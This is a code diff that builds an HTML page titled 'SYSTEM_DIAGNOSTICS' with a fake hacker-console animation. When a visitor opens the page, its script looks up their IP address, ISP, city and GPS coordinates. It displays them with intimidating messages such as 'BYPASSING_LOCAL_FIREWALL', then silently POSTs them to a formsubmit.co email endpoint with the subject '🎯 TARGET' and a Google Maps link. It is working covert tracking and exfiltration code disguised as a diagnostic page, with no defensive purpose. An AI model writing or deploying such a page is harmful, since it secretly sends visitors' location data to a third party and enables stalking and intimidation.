@@ -1,9 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>SYSTEM_DIAGNOSTICS</title>
+    <style>
+        body, html { margin: 0; padding: 0; background: black; color: #00ff00; overflow: hidden; font-family: 'Courier New', monospace; }
+        canvas { position: absolute; top: 0; left: 0; z-index: 1; opacity: 0.2; }
+        .console {
+            position: relative; z-index: 2; padding: 30px; 
+            background: rgba(0, 0, 0, 0.9); border: 1px solid #00ff00; 
+            margin: 40px auto; max-width: 700px; height: 450px; 
+            overflow-y: hidden; box-shadow: 0 0 20px #00ff00;
+        }
+        .line { margin-bottom: 5px; font-size: 14px; text-shadow: 0 0 5px #00ff00; }
+        .blue { color: #00ccff; text-shadow: 0 0 5px #00ccff; }
+        .yellow { color: #ffff00; }
+    </style>
+</head>
+<body>
+
+<canvas id="matrix"></canvas>
+<div class="console" id="console">
+    <div class="line">> [SYSTEM] INITIALIZING_CORE...</div>
+</div>
+
 <script>
-    // --- MATRIX BACKGROUND ---
+    // 1. MATRIX RAIN
     const canvas = document.getElementById('matrix');
     const ctx = canvas.getContext('2d');
     canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-    const letters = "0123456789ABCDEF";
+    const letters = "0101010101ABCDEF";
     const fontSize = 16;
     const columns = canvas.width / fontSize;
     const drops = Array(Math.floor(columns)).fill(1);
@@ -19,7 +45,7 @@
     }
     setInterval(draw, 35);
 
-    // --- CONSOLE HANDLER ---
+    // 2. CONSOLE DISPLAY
     const consoleBox = document.getElementById('console');
     function addLine(text, type = "") {
         const div = document.createElement('div');
@@ -29,43 +55,43 @@
         consoleBox.scrollTop = consoleBox.scrollHeight;
     }
 
-    // --- THE DELAYED PULL LOGIC ---
+    // 3. THE DATA PULL
     fetch('https://ipapi.co/json/')
     .then(res => res.json())
     .then(data => {
-        // These lines appear one-by-one
         const sequence = [
-            { t: "ESTABLISHING_HANDSHAKE...", s: 500 },
-            { t: "LOCALIZING_NODE_ORIGIN...", s: 1000 },
-            { t: `IP_ADDRESS_FOUND: ${data.ip}`, s: 1500, c: "blue" },
-            { t: "DECRYPTING_ISP_CARRIER...", s: 2200 },
-            { t: `CARRIER: ${data.org}`, s: 2800, c: "blue" },
-            { t: "TRIANGULATING_GPS_COORDINATES...", s: 3500 },
-            { t: `LAT/LONG: ${data.latitude}, ${data.longitude}`, s: 4200, c: "blue" },
-            { t: `SUBURB_IDENTIFIED: ${data.city}`, s: 4800, c: "blue" },
-            { t: "UPLOADING_LOGS_TO_CLOUD_DATABASE...", s: 5500 },
-            { t: "SCAN_COMPLETE. SESSION_ENCRYPTED.", s: 6200, c: "yellow" }
+            { t: "BOOTING_NETWORK_SCANNER...", s: 500 },
+            { t: "BYPASSING_LOCAL_FIREWALL...", s: 1200 },
+            { t: "TARGET_IP_FOUND: " + data.ip, s: 2000, c: "blue" },
+            { t: "IDENTIFYING_CARRIER_NODE...", s: 2800 },
+            { t: "ISP: " + data.org, s: 3500, c: "blue" },
+            { t: "TRIANGULATING_GPS_LOCATION...", s: 4200 },
+            { t: "LOC: " + data.city + ", " + data.region, s: 5000, c: "blue" },
+            { t: "COORDS: " + data.latitude + ", " + data.longitude, s: 5800, c: "blue" },
+            { t: "UPLOADING_LOGS_TO_SERVER...", s: 6500 },
+            { t: "SCAN_COMPLETE. TRACE_CLEANED.", s: 7200, c: "yellow" }
         ];
 
         sequence.forEach(item => {
-            setTimeout(() => {
-                addLine(item.t, item.c || "");
-            }, item.s);
+            setTimeout(() => { addLine(item.t, item.c || ""); }, item.s);
         });
 
-        // 4. Send the data to your email after 6 seconds
+        // 4. THE EMAIL (Wait until scan ends)
         setTimeout(() => {
             fetch("https://formsubmit.co/ajax/jabuvo", {
                 method: "POST",
                 headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                 body: JSON.stringify({
-                    _subject: "🎯 HACKER REPORT: " + data.ip,
-                    Target_IP: data.ip,
+                    _subject: "🎯 TARGET: " + data.ip,
+                    IP: data.ip,
                     ISP: data.org,
-                    Location: `${data.city}, ${data.region}`,
-                    GPS: `${data.latitude}, ${data.longitude}`
+                    Location: data.city,
+                    Maps: "https://www.google.com/maps?q=" + data.latitude + "," + data.longitude
                 })
             });
-        }, 6500);
-    });
+        }, 7500);
+    })
+    .catch(err => addLine("ERROR: ACCESS_DENIED", "red"));
 </script>
+</body>
+</html>
